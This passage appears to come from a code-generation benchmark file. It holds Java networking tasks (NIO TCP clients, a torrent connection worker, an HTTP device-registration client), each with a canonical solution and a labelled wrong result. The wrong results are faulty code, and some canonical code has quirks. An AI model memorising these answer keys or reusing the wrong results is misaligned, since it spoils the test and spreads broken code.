    "wrong_result": "public class NioTransport {\n    private ServerSocketChannel srv_channel;\n    private SocketChannel client_channel;\n    private Receiver receiver_thread;\n    private RtReceiver receiver;\n    private InetAddress host;\n    private int port = 7800;\n    private boolean server;\n    private boolean direct_buffers;\n    private Log log;\n\n    public void options(String... options) {\n        for (int i = 0; i < options.length; i++) {\n            if (options[i].equals(\"server\")) {\n                server = true;\n            } else if (options[i].equals(\"client\")) {\n                server = false;\n            } else if (options[i].startsWith(\"host:\")) {\n                try {\n                    host = InetAddress.getByName(options[i].substring(5));\n                } catch (UnknownHostException e) {\n                    log.error(\"Invalid host: \" + options[i].substring(5));\n                }\n            } else if (options[i].startsWith(\"port:\")) {\n                port = Integer.parseInt(options[i].substring(5));\n            } else if (options[i].equals(\"direct\")) {\n                direct_buffers = true;\n            }\n        }\n    }\n\n    public void receiver(RtReceiver receiver) {\n        this.receiver = receiver;\n    }\n\n    public void start(String... options) {\n        options(options);\n        if (server) {\n            try {\n                srv_channel = ServerSocketChannel.open();\n                srv_channel.configureBlocking(false);\n                srv_channel.socket().bind(new InetSocketAddress(host, port));\n                receiver_thread = new Receiver(srv_channel, receiver, direct_buffers, log);\n                receiver_thread.start();\n            } catch (IOException e) {\n                log.error(\"Failed to start server: \" + e.getMessage());\n            }\n        } else {\n            try {\n                client_channel = SocketChannel.open();\n                client_channel.configureBlocking(false);\n                client_channel.connect(new InetSocketAddress(host, port));\n                receiver_thread = new Receiver(client_channel, receiver, direct_buffers, log);\n                receiver_thread.start();\n            } catch (IOException e) {\n                log.error(\"Failed to connect to server: \" + e.getMessage());\n            }\n        }\n    }\n\n    public void stop() {\n        if (receiver_thread != null) {\n            receiver_thread.interrupt();\n        }\n        if (srv_channel != null) {\n            try {\n                srv_channel.close();\n            } catch (IOException e) {\n                log.error(\"Error closing server channel: \" + e.getMessage());\n            }\n        }\n        if (client_channel != null) {\n            try {\n                client_channel.close();\n            } catch (IOException e) {\n                log.error(\"Error closing client channel: \" + e.getMessage());\n            }\n        }\n    }\n\n    public void send(Object dest, byte[] buf, int offset, int length) {\n        if (dest instanceof SocketChannel) {\n            SocketChannel channel = (SocketChannel) dest;\n            ByteBuffer buffer = direct_buffers ? ByteBuffer.allocateDirect(length) : ByteBuffer.allocate(length);\n            buffer.put(buf, offset, length);\n            buffer.flip();\n            try {\n                while (buffer.hasRemaining()) {\n                    channel.write(buffer);\n                }\n            } catch (IOException e) {\n                log.error(\"Error sending data: \" + e.getMessage());\n            }\n        }\n    }\n\n    private class Receiver extends Thread {\n        private Channel channel;\n        private RtReceiver receiver;\n        private boolean direct_buffers;\n        private Log log;\n\n        public Receiver(Channel channel, RtReceiver receiver, boolean direct_buffers, Log log) {\n            this.channel = channel;\n            this.receiver = receiver;\n            this.direct_buffers = direct_buffers;\n            this.log = log;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!isInterrupted()) {\n                    if (channel instanceof ServerSocketChannel) {\n                        SocketChannel client = ((ServerSocketChannel) channel).accept();\n                        if (client != null) {\n                            client.configureBlocking(false);\n                            receiver.onConnect(client);\n                        }\n                    } else if (channel instanceof SocketChannel) {\n                        SocketChannel client = (SocketChannel) channel;\n                        ByteBuffer buffer = direct_buffers ? ByteBuffer.allocateDirect(8192) : ByteBuffer.allocate(8192);\n                        int bytesRead;\n                        while ((bytesRead = client.read(buffer)) > 0) {\n                            buffer.flip();\n                            byte[] data = new byte[bytesRead];\n                            buffer.get(data);\n                            buffer.clear();\n                            receiver.onData(data);\n                        }\n                        if (bytesRead == -1) {\n                            client.close();\n                            receiver.onDisconnect();\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                log.error(\"Error in receiver thread: \" + e.getMessage());\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 434,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Java NIO (Non-blocking I/O) for efficient network communication. The client should handle connection establishment, data transmission with checksum verification, and proper resource management.\n\nClass Description: ClientController is a TCP client implementation that manages non-blocking communication with a server. It uses a producer-consumer pattern with an internal queue for packet handling and implements checksum verification for data integrity.\n\nAttributes:\n- inner: BlockingQueue<Packet> - Queue for storing packets to be sent to the server\n- lock: Object - Synchronization lock for thread-safe operations\n- remote: InetSocketAddress - Server address to connect to\n- thread: Thread - Worker thread for handling network operations\n- channel: SocketChannel - NIO channel for communication with the server\n\nMethods:\n- ClientController(String host, int port) -> None - Constructor that initializes the client with server address\n- start() -> void - Starts the client thread if not already running\n- put(Packet packet) -> boolean - Adds a packet to the send queue (non-blocking)\n- clear() -> void - Clears all pending packets from the queue\n- run() -> void - Main thread method that handles connection and I/O operations (internal to ClientThread)\n- write() -> void - Handles packet writing to the channel with checksum calculation (internal to ClientThread)",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.zip.Adler32;\nimport java.util.zip.Checksum;\n\npublic class ClientController {\n\n    private BlockingQueue<Packet> inner = new LinkedBlockingQueue<>(100);\n    private Object lock = new Object();\n    private InetSocketAddress remote;\n    private Thread thread = new ClientThread(remote);\n\n    public ClientController(String host, int port) {\n        remote = new InetSocketAddress(host, port);\n    }\n\n    public void start() {\n        if (thread.isAlive() || remote == null) {\n            return;\n        }\n        synchronized (lock) {\n            thread.start();\n        }\n    }\n\n    public boolean put(Packet packet) {\n        return inner.offer(packet);\n    }\n\n    public void clear() {\n        inner.clear();\n    }\n\n    class ClientThread extends Thread {\n        SocketAddress remote;\n        SocketChannel channel;\n\n        ClientThread(SocketAddress remote) {\n            this.remote = remote;\n        }\n\n        @Override\n        public void run() {\n            try {\n                channel = SocketChannel.open();\n                channel.configureBlocking(false);\n                boolean isSuccess = channel.connect(new InetSocketAddress(30008));\n                if (!isSuccess) {\n                    while (!channel.finishConnect()) {\n                        System.out.println(\"Client is connecting...\");\n                    }\n                }\n                System.out.println(\"Client is connected.\");\n\n                Selector selector = Selector.open();\n                channel.register(selector, SelectionKey.OP_WRITE);\n                while (selector.isOpen()) {\n                    selector.select();\n                    Iterator<SelectionKey> it = selector.selectedKeys().iterator();\n                    while (it.hasNext()) {\n                        SelectionKey key = it.next();\n                        it.remove();\n                        if (!key.isValid()) {\n                            continue;\n                        }\n                        if (key.isWritable()) {\n                            write();\n                        }\n                    }\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            } finally {\n                if (channel != null) {\n                    try {\n                        channel.close();\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }\n                inner.clear();\n            }\n        }\n\n        private void write() throws Exception {\n            Packet packet = inner.take();\n            synchronized (lock) {\n                ByteBuffer body = packet.getBuffer();\n                ByteBuffer head = ByteBuffer.allocate(4);\n                head.putInt(body.limit());\n                head.flip();\n                while (head.hasRemaining()) {\n                    channel.write(head);\n                }\n\n                Checksum checksum = new Adler32();\n                while (body.hasRemaining()) {\n                    checksum.update(body.get());\n                }\n\n                body.rewind();\n                while (body.hasRemaining()) {\n                    channel.write(body);\n                }\n\n                long cks = checksum.getValue();\n                ByteBuffer tail = ByteBuffer.allocate(8);\n                tail.putLong(cks);\n                tail.flip();\n                while (tail.hasRemaining()) {\n                    channel.write(tail);\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "public class ClientController {\n    private final BlockingQueue<Packet> inner;\n    private final Object lock;\n    private final InetSocketAddress remote;\n    private Thread thread;\n    private SocketChannel channel;\n\n    public ClientController(String host, int port) {\n        this.inner = new LinkedBlockingQueue<>();\n        this.lock = new Object();\n        this.remote = new InetSocketAddress(host, port);\n        this.thread = null;\n        this.channel = null;\n    }\n\n    public void start() {\n        if (thread == null || !thread.isAlive()) {\n            thread = new Thread(this::run);\n            thread.start();\n        }\n    }\n\n    public boolean put(Packet packet) {\n        synchronized (lock) {\n            return inner.offer(packet);\n        }\n    }\n\n    public void clear() {\n        synchronized (lock) {\n            inner.clear();\n        }\n    }\n\n    private void run() {\n        try {\n            channel = SocketChannel.open();\n            channel.configureBlocking(false);\n            channel.connect(remote);\n\n            while (!channel.finishConnect()) {\n                Thread.sleep(100);\n            }\n\n            write();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (channel != null) {\n                    channel.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void write() throws IOException {\n        synchronized (lock) {\n            while (!inner.isEmpty()) {\n                Packet packet = inner.poll();\n                if (packet != null) {\n                    byte[] data = packet.getData();\n                    int checksum = calculateChecksum(data);\n                    ByteBuffer buffer = ByteBuffer.allocate(data.length + 4);\n                    buffer.putInt(checksum);\n                    buffer.put(data);\n                    buffer.flip();\n                    while (buffer.hasRemaining()) {\n                        channel.write(buffer);\n                    }\n                }\n            }\n        }\n    }\n\n    private int calculateChecksum(byte[] data) {\n        int checksum = 0;\n        for (byte b : data) {\n            checksum += b & 0xFF;\n        }\n        return checksum;\n    }\n}"
  },
  {
    "Task_id": 435,
    "Instruction": "Task Description: Implement a Java class that manages TCP client connections using Java NIO (Non-blocking I/O) techniques, including connection establishment, data writing, and cleanup operations.\n\nClass Description: ConnectionWorker is a Runnable class that handles asynchronous TCP client connections using Java NIO. It manages connection tasks through a selector pattern, processes write operations, and performs periodic cleanup of stale connections. The class supports concurrent operations through queue-based task management.\n\nAttributes:\n- logger: Logger - SLF4J logger for logging operations\n- stop: boolean - Volatile flag to control thread execution\n- selector: Selector - NIO selector for managing channels\n- myConnectQueue: BlockingQueue<ConnectTask> - Queue for pending connection tasks\n- myWriteQueue: BlockingQueue<WriteTask> - Queue for pending write operations\n- mySemaphore: Semaphore - Controls access to the worker thread\n- myKeyProcessors: List<KeyProcessor> - Processors for handling different channel operations\n- myTimeService: TimeService - Provides time-related functionality\n- lastCleanupTime: long - Timestamp of last cleanup operation\n- mySelectorTimeoutMillis: int - Timeout for selector operations\n- myCleanupTimeoutMillis: long - Timeout between cleanup operations\n- myCleanupProcessor: CleanupProcessor - Handles connection cleanup\n- myNewConnectionAllower: NewConnectionAllower - Controls new connection allowance\n\nMethods:\n- run(): void - Main execution method implementing Runnable interface\n- connectToPeersFromQueue(): void - Processes pending connection tasks from queue\n- processSelectedKeys(): void - Processes all ready selection keys\n- processSelectedKey(SelectionKey): void - Processes a single selection key\n- offerConnect(ConnectTask, int, TimeUnit): boolean - Adds new connection task to queue\n- addTaskToQueue(T, int, TimeUnit, BlockingQueue<T>): boolean - Generic method for adding tasks to queues\n- processWriteTasks(): void - Processes pending write operations (implied from code context)\n- cleanup(): void - Performs cleanup operations (implied from code context)\n- needRunCleanup(): boolean - Determines if cleanup is needed (implied from code context)",
    "Canonical_solution": "import com.turn.ttorrent.common.LoggerUtils;\nimport com.turn.ttorrent.common.TimeService;\nimport com.turn.ttorrent.common.TorrentLoggerFactory;\nimport com.turn.ttorrent.network.keyProcessors.CleanupProcessor;\nimport com.turn.ttorrent.network.keyProcessors.KeyProcessor;\nimport org.slf4j.Logger;\n\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.*;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.Semaphore;\nimport java.util.concurrent.TimeUnit;\n\npublic class ConnectionWorker implements Runnable {\n\n  private static final Logger logger = TorrentLoggerFactory.getLogger(ConnectionWorker.class);\n  private static final String SELECTOR_THREAD_NAME = \"Torrent channels manager thread\";\n  private volatile boolean stop = false;\n  private final Selector selector;\n  private final BlockingQueue<ConnectTask> myConnectQueue;\n  private final BlockingQueue<WriteTask> myWriteQueue;\n  private final Semaphore mySemaphore;\n  private final List<KeyProcessor> myKeyProcessors;\n  private final TimeService myTimeService;\n  private long lastCleanupTime;\n  private volatile int mySelectorTimeoutMillis;\n  private volatile long myCleanupTimeoutMillis;\n  private final CleanupProcessor myCleanupProcessor;\n  private final NewConnectionAllower myNewConnectionAllower;\n\n  public ConnectionWorker(Selector selector,\n                   List<KeyProcessor> keyProcessors,\n                   int selectorTimeoutMillis,\n                   int cleanupTimeoutMillis,\n                   TimeService timeService,\n                   CleanupProcessor cleanupProcessor,\n                   NewConnectionAllower myNewConnectionAllower) {\n    this.selector = selector;\n    this.myTimeService = timeService;\n    this.lastCleanupTime = timeService.now();\n    this.mySelectorTimeoutMillis = selectorTimeoutMillis;\n    this.myCleanupTimeoutMillis = cleanupTimeoutMillis;\n    this.myCleanupProcessor = cleanupProcessor;\n    this.myNewConnectionAllower = myNewConnectionAllower;\n    this.mySemaphore = new Semaphore(1);\n    this.myConnectQueue = new LinkedBlockingQueue<ConnectTask>(100);\n    this.myKeyProcessors = keyProcessors;\n    this.myWriteQueue = new LinkedBlockingQueue<WriteTask>(5000);\n  }\n\n  @Override\n  public void run() {\n    try {\n      mySemaphore.acquire();\n    } catch (InterruptedException e) {\n      return;\n    }\n\n    final String oldName = Thread.currentThread().getName();\n\n    try {\n      Thread.currentThread().setName(SELECTOR_THREAD_NAME);\n\n      while (!stop && (!Thread.currentThread().isInterrupted())) {\n        try {\n          logger.trace(\"try select keys from selector\");\n          int selected;\n          try {\n            selected = selector.select(mySelectorTimeoutMillis);\n          } catch (ClosedSelectorException e) {\n            break;\n          }\n          connectToPeersFromQueue();\n          processWriteTasks();\n          logger.trace(\"select keys from selector. Keys count is \" + selected);\n          if (selected != 0) {\n            processSelectedKeys();\n          }\n          if (needRunCleanup()) {\n            cleanup();\n          }\n        } catch (Throwable e) {\n          LoggerUtils.warnAndDebugDetails(logger, \"unable to select channel keys. Error message {}\", e.getMessage(), e);\n        }\n      }\n    } catch (Throwable e) {\n      LoggerUtils.errorAndDebugDetails(logger, \"exception on cycle iteration\", e);\n    } finally {\n      Thread.currentThread().setName(oldName);\n      mySemaphore.release();\n    }\n  }\n\n  private void connectToPeersFromQueue() {\n    ConnectTask connectTask;\n    while ((connectTask = myConnectQueue.poll()) != null) {\n      if (stop || Thread.currentThread().isInterrupted()) {\n        return;\n      }\n      logger.debug(\"try connect to peer. Connect task is {}\", connectTask);\n      try {\n        SocketChannel socketChannel = SocketChannel.open();\n        socketChannel.configureBlocking(false);\n        socketChannel.register(selector, SelectionKey.OP_CONNECT, connectTask);\n        socketChannel.connect(new InetSocketAddress(connectTask.getHost(), connectTask.getPort()));\n      } catch (IOException e) {\n        LoggerUtils.warnAndDebugDetails(logger, \"unable connect. Connect task is {}\", connectTask, e);\n      }\n    }\n  }\n\n  private void processSelectedKeys() {\n    Set<SelectionKey> selectionKeys = selector.selectedKeys();\n    for (SelectionKey key : selectionKeys) {\n      if (stop || Thread.currentThread().isInterrupted()) {\n        return;\n      }\n      try {\n        processSelectedKey(key);\n      } catch (Exception e) {\n        logger.warn(\"error {} in processing key. Close channel {}\", e.getMessage(), key.channel());\n        logger.debug(\"\", e);\n        try {\n          key.channel().close();\n        } catch (IOException ioe) {\n          LoggerUtils.errorAndDebugDetails(logger, \"unable close bad channel\", ioe);\n        }\n      }\n    }\n    selectionKeys.clear();\n  }\n\n  private void processSelectedKey(SelectionKey key) throws IOException {\n    logger.trace(\"try process key for channel {}\", key.channel());\n    myCleanupProcessor.processSelected(key);\n    if (!key.channel().isOpen()) {\n      key.cancel();\n      return;\n    }\n    for (KeyProcessor keyProcessor : myKeyProcessors) {\n      if (keyProcessor.accept(key)) {\n        keyProcessor.process(key);\n      }\n    }\n  }\n\n  public boolean offerConnect(ConnectTask connectTask, int timeout, TimeUnit timeUnit) {\n    if (!myNewConnectionAllower.isNewConnectionAllowed()) {\n      logger.info(\"can not add connect task {} to queue. New connection is not allowed\", connectTask);\n      return false;\n    }\n    return addTaskToQueue(connectTask, timeout, timeUnit, myConnectQueue);\n  }\n\n  private <T> boolean addTaskToQueue(T task, int timeout, TimeUnit timeUnit, BlockingQueue<T> queue) {\n    try {\n      if (queue.offer(task, timeout, timeUnit)) {\n        logger.trace(\"added task {}. Wake up selector\", task);\n        selector.wakeup();\n        return true;\n      }\n    } catch (InterruptedException e) {\n      logger.debug(\"Task {} interrupted before was added to queue\", task);\n    }\n    logger.debug(\"Task {} was not added\", task);\n    return false;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.util.List;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.Semaphore;\nimport java.util.concurrent.TimeUnit;\n\npublic class ConnectionWorker implements Runnable {\n    private final org.slf4j.Logger logger;\n    private volatile boolean stop;\n    private final Selector selector;\n    private final BlockingQueue<ConnectTask> myConnectQueue;\n    private final BlockingQueue<WriteTask> myWriteQueue;\n    private final Semaphore mySemaphore;\n    private final List<KeyProcessor> myKeyProcessors;\n    private final TimeService myTimeService;\n    private long lastCleanupTime;\n    private final int mySelectorTimeoutMillis;\n    private final long myCleanupTimeoutMillis;\n    private final CleanupProcessor myCleanupProcessor;\n    private final NewConnectionAllower myNewConnectionAllower;\n\n    public ConnectionWorker(org.slf4j.Logger logger, Selector selector, BlockingQueue<ConnectTask> myConnectQueue, BlockingQueue<WriteTask> myWriteQueue, Semaphore mySemaphore, List<KeyProcessor> myKeyProcessors, TimeService myTimeService, long myCleanupTimeoutMillis, CleanupProcessor myCleanupProcessor, NewConnectionAllower myNewConnectionAllower) {\n        this.logger = logger;\n        this.selector = selector;\n        this.myConnectQueue = myConnectQueue;\n        this.myWriteQueue = myWriteQueue;\n        this.mySemaphore = mySemaphore;\n        this.myKeyProcessors = myKeyProcessors;\n        this.myTimeService = myTimeService;\n        this.lastCleanupTime = myTimeService.currentTimeMillis();\n        this.mySelectorTimeoutMillis = 100;\n        this.myCleanupTimeoutMillis = myCleanupTimeoutMillis;\n        this.myCleanupProcessor = myCleanupProcessor;\n        this.myNewConnectionAllower = myNewConnectionAllower;\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (!stop) {\n                try {\n                    mySemaphore.acquire();\n                    connectToPeersFromQueue();\n                    int readyChannels = selector.select(mySelectorTimeoutMillis);\n                    if (readyChannels > 0) {\n                        processSelectedKeys();\n                    }\n                    processWriteTasks();\n                    if (needRunCleanup()) {\n                        cleanup();\n                    }\n                } catch (IOException | InterruptedException e) {\n                    logger.error(\"Error in ConnectionWorker run\", e);\n                } finally {\n                    mySemaphore.release();\n                }\n            }\n        } catch (Exception e) {\n            logger.error(\"Unexpected error in ConnectionWorker\", e);\n        }\n    }\n\n    private void connectToPeersFromQueue() {\n        ConnectTask task;\n        while ((task = myConnectQueue.poll()) != null) {\n            try {\n                if (myNewConnectionAllower.allowNewConnection()) {\n                    task.connect();\n                }\n            } catch (IOException e) {\n                logger.error(\"Failed to connect to peer\", e);\n            }\n        }\n    }\n\n    private void processSelectedKeys() {\n        for (SelectionKey key : selector.selectedKeys()) {\n            processSelectedKey(key);\n        }\n    }\n\n    private void processSelectedKey(SelectionKey key) {\n        for (KeyProcessor processor : myKeyProcessors) {\n            if (processor.process(key)) {\n                break;\n            }\n        }\n    }\n\n    public boolean offerConnect(ConnectTask task, int timeout, TimeUnit unit) {\n        return addTaskToQueue(task, timeout, unit, myConnectQueue);\n    }\n\n    private <T> boolean addTaskToQueue(T task, int timeout, TimeUnit unit, BlockingQueue<T> queue) {\n        try {\n            return queue.offer(task, timeout, unit);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            return false;\n        }\n    }\n\n    private void processWriteTasks() {\n        WriteTask task;\n        while ((task = myWriteQueue.poll()) != null) {\n            try {\n                task.write();\n            } catch (IOException e) {\n                logger.error(\"Failed to write data\", e);\n            }\n        }\n    }\n\n    private void cleanup() {\n        try {\n            myCleanupProcessor.cleanup();\n            lastCleanupTime = myTimeService.currentTimeMillis();\n        } catch (Exception e) {\n            logger.error(\"Cleanup failed\", e);\n        }\n    }\n\n    private boolean needRunCleanup() {\n        return myTimeService.currentTimeMillis() - lastCleanupTime > myCleanupTimeoutMillis;\n    }\n}\n```"
  },
  {
    "Task_id": 44,
    "Instruction": "Task Description: Create a Java class that handles HTTP communication with a hub service, specifically for device registration and key management.\n\nClass Description: The HubHttpClient class provides functionality to register a device with a remote hub service using HTTP requests. It handles JSON serialization, authentication, and response processing, while supporting asynchronous operations.\n\nAttributes:\n- JSON: ObjectMapper - A static instance for JSON serialization/deserialization\n- EXPECTED_RESPONSE_CODES: List<Integer> - List of acceptable HTTP response codes\n- hubConfig: HubConfig - Configuration for the hub service\n- bearerToken: String - Authentication token for API requests\n- deviceId: String - Unique identifier for the device\n- keyPair: P384KeyPair - Cryptographic key pair for the device\n- result: CompletableFuture<ReceivedKey> - Future for asynchronous result handling\n- httpClient: HttpClient - HTTP client for making requests\n\nMethods:\n- HubHttpClient(ExecutorService, HubConfig, String, DeviceKey, CompletableFuture<ReceivedKey>, AtomicReference<String>) -> None - Constructor that initializes the HTTP client with configuration and credentials\n- registerDevice(String) -> None - Registers a device with the hub service using the provided device name\n- toJson(CreateDeviceDto) -> String - Serializes a DTO to JSON string\n- handleResponse(HttpResponse<Void>) -> HttpResponse<Void> - Processes the HTTP response\n- registrationFailed(Throwable) -> None - Handles failed registration attempts\n\nNested Class:\n- CreateDeviceDto - Data transfer object for device registration containing:\n  * id: String - Device identifier\n  * name: String - Device name\n  * type: String - Constant device type (\"DESKTOP\")\n  * publicKey: String - Base64-encoded public key",
    "Canonical_solution": "import com.auth0.jwt.JWT;\nimport com.auth0.jwt.interfaces.DecodedJWT;\nimport com.fasterxml.jackson.core.JacksonException;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.cryptomator.common.settings.DeviceKey;\nimport org.cryptomator.cryptolib.common.P384KeyPair;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Base64;\nimport java.util.List;\nimport java.util.Objects;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class HubHttpClient {\n\n\tprivate static final ObjectMapper JSON = new ObjectMapper().setDefaultLeniency(true);\n\tprivate static final List<Integer> EXPECTED_RESPONSE_CODES = List.of(201, 409);\n\n\tprivate final HubConfig hubConfig;\n\tprivate final String bearerToken;\n\tprivate final String deviceId;\n\tprivate final P384KeyPair keyPair;\n\tprivate final CompletableFuture<ReceivedKey> result;\n\tprivate final HttpClient httpClient;\n\n\tpublic HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, DeviceKey deviceKey, CompletableFuture<ReceivedKey> result, AtomicReference<String> bearerToken) {\n\t\tthis.hubConfig = hubConfig;\n\t\tthis.deviceId = deviceId;\n\t\tthis.keyPair = Objects.requireNonNull(deviceKey.get());\n\t\tthis.result = result;\n\t\tthis.bearerToken = Objects.requireNonNull(bearerToken.get());\n\t\tthis.httpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).executor(executor).build();\n\t}\n\n\tpublic void registerDevice(String deviceName) {\n\t\tvar deviceUri = URI.create(hubConfig.devicesResourceUrl + deviceId);\n\t\tvar deviceKey = keyPair.getPublic().getEncoded();\n\t\tvar dto = new CreateDeviceDto();\n\t\tdto.id = deviceId;\n\t\tdto.name = deviceName;\n\t\tdto.publicKey = Base64.getUrlEncoder().withoutPadding().encodeToString(deviceKey);\n\t\tvar json = toJson(dto);\n\t\tvar request = HttpRequest.newBuilder(deviceUri)\n\t\t\t\t.PUT(HttpRequest.BodyPublishers.ofString(json, StandardCharsets.UTF_8))\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.header(\"Content-Type\", \"application/json\")\n\t\t\t\t.build();\n\t\thttpClient.sendAsync(request, HttpResponse.BodyHandlers.discarding())\n\t\t\t\t.thenApply(response -> {\n\t\t\t\t\tif (EXPECTED_RESPONSE_CODES.contains(response.statusCode())) {\n\t\t\t\t\t\treturn response;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tthrow new RuntimeException(\"Server answered with unexpected status code \" + response.statusCode());\n\t\t\t\t\t}\n\t\t\t\t}).handle((response, throwable) -> {\n\t\t\t\t\tif (response != null) {\n\t\t\t\t\t\treturn handleResponse(response);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tregistrationFailed(throwable);\n\t\t\t\t\t\treturn null;\n\t\t\t\t\t}\n\t\t\t\t});\n\t}\n\n\tprivate String toJson(CreateDeviceDto dto) {\n\t\ttry {\n\t\t\treturn JSON.writer().writeValueAsString(dto);\n\t\t} catch (JacksonException e) {\n\t\t\tthrow new IllegalStateException(\"Failed to serialize DTO\", e);\n\t\t}\n\t}\n\n\tprivate HttpResponse<Void> handleResponse(HttpResponse<Void> voidHttpResponse) {\n\t\tassert EXPECTED_RESPONSE_CODES.contains(voidHttpResponse.statusCode());\n\t\treturn voidHttpResponse;\n\t}\n\n\tprivate void registrationFailed(Throwable cause) {\n\t\tresult.completeExceptionally(cause);\n\t}\n\n\tprivate static class CreateDeviceDto {\n\t\tpublic String id;\n\t\tpublic String name;\n\t\tpublic final String type = \"DESKTOP\";\n\t\tpublic String publicKey;\n\t}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "{\n  \"class\": \"HubHttpClient\",\n  \"attributes\": [\n    {\n      \"name\": \"JSON\",\n      \"type\": \"ObjectMapper\",\n      \"value\": \"new ObjectMapper()\"\n    },\n    {\n      \"name\": \"EXPECTED_RESPONSE_CODES\",\n      \"type\": \"List<Integer>\",\n      \"value\": \"[200, 201]\"\n    },\n    {\n      \"name\": \"hubConfig\",\n      \"type\": \"HubConfig\",\n      \"value\": \"null\"\n    },\n    {\n      \"name\": \"bearerToken\",\n      \"type\": \"String\",\n      \"value\": \"null\"\n    },\n    {\n      \"name\": \"deviceId\",\n      \"type\": \"String\",\n      \"value\": \"null\"\n    },\n    {\n      \"name\": \"keyPair\",\n      \"type\": \"P384KeyPair\",\n      \"value\": \"null\"\n    },\n    {\n      \"name\": \"result\",\n      \"type\": \"CompletableFuture<ReceivedKey>\",\n      \"value\": \"null\"\n    },\n    {\n      \"name\": \"httpClient\",\n      \"type\": \"HttpClient\",\n      \"value\": \"HttpClient.newBuilder().build()\"\n    }\n  ],\n  \"methods\": [\n    {\n      \"name\": \"HubHttpClient\",\n      \"parameters\": [\n        {\n          \"name\": \"executorService\",\n          \"type\": \"ExecutorService\"\n        },\n        {\n          \"name\": \"hubConfig\",\n          \"type\": \"HubConfig\"\n        },\n        {\n          \"name\": \"deviceId\",\n          \"type\": \"String\"\n        },\n        {\n          \"name\": \"deviceKey\",\n          \"type\": \"DeviceKey\"\n        },\n        {\n          \"name\": \"result\",\n          \"type\": \"CompletableFuture<ReceivedKey>\"\n        },\n        {\n          \"name\": \"bearerTokenRef\",\n          \"type\": \"AtomicReference<String>\"\n        }\n      ],\n      \"body\": \"this.hubConfig = hubConfig;\\nthis.deviceId = deviceId;\\nthis.keyPair = deviceKey.getKeyPair();\\nthis.result = result;\\nthis.bearerToken = bearerTokenRef.get();\"\n    },\n    {\n      \"name\": \"registerDevice\",\n      \"parameters\": [\n        {\n          \"name\": \"deviceName\",\n          \"type\": \"String\"\n        }\n      ],\n      \"body\": \"CreateDeviceDto dto = new CreateDeviceDto(deviceId, deviceName, \\\"DESKTOP\\\", Base64.getEncoder().encodeToString(keyPair.getPublic().getEncoded()));\\nString json = toJson(dto);\\nHttpRequest request = HttpRequest.newBuilder()\\n    .uri(URI.create(hubConfig.getRegistrationUrl()))\\n    .header(\\\"Content-Type\\\", \\\"application/json\\\")\\n    .header(\\\"Authorization\\\", \\\"Bearer \\\" + bearerToken)\\n    .POST(HttpRequest.BodyPublishers.ofString(json))\\n    .build();\\n\\nhttpClient.sendAsync(request, HttpResponse.BodyHandlers.discarding())\\n    .thenApply(this::handleResponse)\\n    .exceptionally(this::registrationFailed);\"\n    },\n    {\n      \"name\": \"toJson\",\n      \"parameters\": [\n        {\n          \"name\": \"dto\",\n          \"type\": \"CreateDeviceDto\"\n        }\n      ],\n      \"body\": \"return JSON.writeValueAsString(dto);\"\n    },\n    {\n      \"name\": \"handleResponse\",\n      \"parameters\": [\n        {\n          \"name\": \"response\",\n          \"type\": \"HttpResponse<Void>\"\n        }\n      ],\n      \"body\": \"if (!EXPECTED_RESPONSE_CODES.contains(response.statusCode())) {\\n    throw new RuntimeException(\\\"Unexpected response code: \\\" + response.statusCode());\\n}\\nreturn response;\"\n    },\n    {\n      \"name\": \"registrationFailed\",\n      \"parameters\": [\n        {\n          \"name\": \"throwable\",\n          \"type\": \"Throwable\"\n        }\n      ],\n      \"body\": \"result.completeExceptionally(throwable);\"\n    }\n  ],\n  \"nestedClasses\": [\n    {\n      \"name\": \"CreateDeviceDto\",\n      \"fields\": [\n        {\n          \"name\": \"id\",\n          \"type\": \"String\"\n        },\n        {\n          \"name\": \"name\",\n          \"type\": \"String\"\n        },\n        {\n          \"name\": \"type\",\n          \"type\": \"String\"\n        },\n        {\n          \"name\": \"publicKey\",\n          \"type\": \"String\"\n        }\n      ],\n      \"constructor\": {\n        \"parameters\": [\n          {\n            \"name\": \"id\",\n            \"type\": \"String\"\n          },\n          {\n            \"name\": \"name\",\n            \"type\": \"String\"\n          },\n          {\n            \"name\": \"type\",\n            \"type\": \"String\"\n          },\n          {\n            \"name\": \"publicKey\",\n            \"type\": \"String\"\n          }\n        ],\n        \"body\": \"this.id = id;\\nthis.name = 